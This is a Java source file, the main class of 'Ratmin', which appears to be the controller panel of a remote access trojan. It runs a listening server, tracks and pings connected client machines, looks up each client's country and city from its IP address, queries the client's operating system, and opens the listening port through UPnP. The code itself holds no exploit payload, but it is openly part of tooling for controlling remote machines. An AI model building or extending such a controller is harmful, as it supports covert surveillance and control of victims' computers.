package me.slimig.ratmin.user_interface;

import java.awt.Font;
import java.io.IOException;
import java.io.InputStream;
import java.net.BindException;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URISyntaxException;
import java.net.URL;
import java.util.Iterator;
import java.util.concurrent.ConcurrentHashMap;

import javax.sound.sampled.LineUnavailableException;
import javax.swing.JOptionPane;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;

import com.alee.laf.WebLookAndFeel;
import com.dosse.upnp.UPnP;
import com.maxmind.geoip2.DatabaseReader;
import com.maxmind.geoip2.exception.GeoIp2Exception;
import com.maxmind.geoip2.model.CityResponse;

import me.slimig.ratmin.server.Server;
import me.slimig.ratmin.server.Streams;
import me.slimig.ratmin.server.threads.PingCheck;
import me.slimig.ratmin.server.threads.TimeHelper;
import me.slimig.ratmin.user_interface.Config.ConfigManager;
import me.slimig.ratmin.user_interface.Ui.Ui;
import me.slimig.ratmin.utils.Notifications.NotificationSound;
import me.slimig.ratmin.utils.Notifications.Toaster;
import me.slimig.ratmin.utils.Packets.Packet;

public class Ratmin {

    public static Server selserver;
    @SuppressWarnings("unused")
    private static TimeHelper th;
    public static Ui gui;
    public static InputStream geoipStream;
    public static int port;
    public static URL dbCityLocation = Ratmin.class.getResource("/resources/City.mmdb");

    public static void ping(Server server) throws IOException, GeoIp2Exception, URISyntaxException {
        ConcurrentHashMap<Socket, Streams> map = server.getMap();
        int i = 0;
        for (Socket s : map.keySet()) {
            if (!map.get(s).sendMsg(Packet.PING.getPacketID()) || map.get(s).readMsg() == null) {
                System.err.println("Client not answering: " + s.getRemoteSocketAddress());
                System.err.flush();
                Ratmin.gui.setTitle("Ratmin - Connected: " + (Ratmin.selserver.getMap().size() - 1));
                map.remove(s);

                UpdateTable();
            } else {
                System.out.println(i + ") " + s.getRemoteSocketAddress());
                i++;
            }

        }

    }

    public static void UpdateTable() throws IOException, GeoIp2Exception {
        Iterator<Socket> iterator = Ratmin.selserver.getMap().keySet().iterator();
        Socket selectedSocket;
        try {
            Ratmin.geoipStream = dbCityLocation.openStream();
        } catch (Exception e) {
            e.printStackTrace();
        }

        DatabaseReader dbReader = new DatabaseReader.Builder(Ratmin.geoipStream).build();

        Ui.tableModel.setRowCount(0);
        for (int e = 0; e < Ratmin.selserver.getMap().size(); e++) {
            Object[] data = new String[4];

            if (iterator.hasNext()) {
                selectedSocket = iterator.next();
                Streams selectedStreams = Ratmin.selserver.getMap().get(selectedSocket);

                InetAddress ipAddress = InetAddress
                        .getByName(selectedSocket.getInetAddress().toString().replace("/", ""));
                CityResponse response = dbReader.city(ipAddress);

                data[0] = selectedSocket.getInetAddress().toString().replace("/", "");
                data[1] = response.getCountry().getName();
                data[2] = response.getCity().getName();
                selectedStreams.sendMsg(Packet.OS.getPacketID());
                data[3] = selectedStreams.readMsg();
                Ratmin.gui.setTitle("Ratmin - Connected: " + (Ratmin.selserver.getMap().size()));
                Ui.tableModel.addRow(data);

                if (Ui.table.getModel().getRowCount() == 0) {
                    Ui.table.setModel(Ui.tableModel);
                }

                Ui.tableModel.fireTableDataChanged();
            }
        }
    }

    public static void main(String[] args) {

        // System.out.println("C:\\Program Files\\Java\\jdk"+
        // System.getProperty("java.version"));

        // System.getProperty("java.version"));

        /*
         * String port = JOptionPane.showInputDialog("Please enter server port"); Server
         * server = null; try { server = new Server(Integer.parseInt(port)); } catch
         * (NumberFormatException e) { e.printStackTrace(); } catch (BindException e) {
         * JOptionPane.showMessageDialog(null, "   Port already in use!", "Error", 0);
         * System.exit(0); } catch (IOException e) { e.printStackTrace(); }
         *
         * server.startServer(); Ratmin.selserver = server; Ratmin.port =
         * Integer.parseInt(port);
         */

        try {
            WebLookAndFeel.install();
        } catch (Exception e) {
            if (System.getProperty("os.name").contains("Windows")) {
                try {
                    UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
                    // UIManager.setLookAndFeel( "com.seaglasslookandfeel.SeaGlassLookAndFeel" );
                } catch (ClassNotFoundException e1) {
                    e1.printStackTrace();
                } catch (InstantiationException e1) {
                    e1.printStackTrace();
                } catch (IllegalAccessException e1) {
                    e1.printStackTrace();
                } catch (UnsupportedLookAndFeelException e1) {
                    e1.printStackTrace();
                }
            } else {
                try {
                    UIManager.setLookAndFeel(UIManager.getCrossPlatformLookAndFeelClassName());
                } catch (ClassNotFoundException | InstantiationException | IllegalAccessException
                        | UnsupportedLookAndFeelException e1) {
                    e1.printStackTrace();
                }
            }
        }

        ConfigManager.createConfig();
        port = (int) Integer.parseInt(ConfigManager.readKey("Port"));
        if (Boolean.valueOf(ConfigManager.readKey("ListenOnLaunch")) == true) {
            try {
                Ratmin.selserver = new Server(port);
                Ratmin.selserver.startServer();
            } catch (BindException e) {
                JOptionPane.showMessageDialog(null, "   Port already in use!", "Error", 0);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        try {
            gui = new Ui();
        } catch (Exception e) {

            e.printStackTrace();
        }

        gui.setVisible(true);
        if (Boolean.valueOf(ConfigManager.readKey("UPnP")) == true) {
            portforward(port);
        }
        PingCheck pc = new PingCheck("PingC");
        pc.run();

    }

    public static void portforward(int port2f) {
        System.out.println("Attempting UPnP port forwarding...");
        if (UPnP.isUPnPAvailable()) { // is UPnP available?
            if (UPnP.isMappedTCP(port2f)) { // is the port already mapped?
                System.out.println("UPnP port forwarding not enabled: port is already mapped");

                Toaster toaster = new Toaster();
                toaster.setToasterMessageFont(new Font("Verdana", Font.PLAIN, 14));
                toaster.setToasterHeight(46);

                try {
                    NotificationSound.tone(9000, 300);
                } catch (LineUnavailableException e) {
                    e.printStackTrace();
                }

                toaster.showToaster("Ratmin\nPort already forwarded!");
            } else if (UPnP.openPortTCP(port2f)) { // try to map port
                System.out.println("UPnP port forwarding enabled");

                Toaster toaster = new Toaster();
                toaster.setToasterMessageFont(new Font("Verdana", Font.PLAIN, 14));
                toaster.setToasterHeight(46);

                try {
                    NotificationSound.tone(9000, 300);
                } catch (LineUnavailableException e) {
                    e.printStackTrace();
                }

                toaster.showToaster("Ratmin\nPort forwarded!");
            } else {
                System.out.println("UPnP port forwarding failed");
            }
        } else {
            System.out.println("UPnP is not available");
        }

    }

}
